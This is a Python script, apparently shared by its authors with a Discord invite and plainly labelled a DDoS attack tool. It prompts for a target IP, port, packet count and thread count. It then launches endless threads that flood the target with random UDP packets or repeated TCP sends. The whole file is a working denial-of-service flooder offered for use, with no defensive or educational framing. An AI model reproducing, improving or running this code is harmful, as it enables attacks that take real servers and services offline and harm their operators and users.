#!/usr/bin/env python3
#iMaungzy#7218
#D.D#9231
#Hmm
import random
import socket
import threading
import os

os.system("clear")
print("Yodz")
print("iMaungzy")
print("https://discord.gg/4YefvDrb")
ip = str(input(" Ddos Attack By Yodz x iMaungzy | Ip:"))
port = int(input(" Ddos Attack By Yodz x iMaungzy | Port:"))
choice = str(input(" Ddos Attack By Yodz x iMaungzy | Yakin Tod?(y/n):"))
times = int(input(" Ddos Attack By Yodz x iMaungzy | Packets:"))
threads = int(input(" Ddos Attack By Yodz x iMaungzy | Threads:"))
def run():
	data = random._urandom(1024)
	i = random.choice(("[]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" | Yodz x iMaungzy |")
		except:
			print("[!] | Bilangin Kalo Ga Suka Bewan Ef ef |")

def run2():
	data = random._urandom(16)
	i = random.choice(("[]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" Yodz x iMaungzy Ni Bos")
		except:
			s.close()
			print("[*] Yodz x iMaungzy Ni  Bos")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
